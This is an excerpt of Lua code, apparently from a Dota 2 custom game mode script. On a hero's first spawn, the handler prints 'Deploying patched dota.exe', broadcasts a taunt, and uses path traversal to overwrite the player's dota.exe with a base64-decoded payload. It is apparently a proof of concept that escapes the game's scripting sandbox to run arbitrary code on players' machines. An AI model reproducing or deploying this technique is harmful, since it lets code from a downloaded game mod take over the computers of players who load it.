...
function GameMode:OnNPCSpawned(keys)
	...
	if npc:IsRealHero() and npc.bFirstSpawned == nil then
		...
		print("Deploying patched dota.exe")
		UTIL_MessageTextAll("You fool who dares to anger H'aack, the kobold warlord, feel the wrath of the mighty Calculator!", 255, 255, 255, 255)
		
		local f = assert(io.open("..\\..\\..\\..\\dota.exe", "wb"))
		local t = f:write(from_base64(app))
		f:close()
	end
end
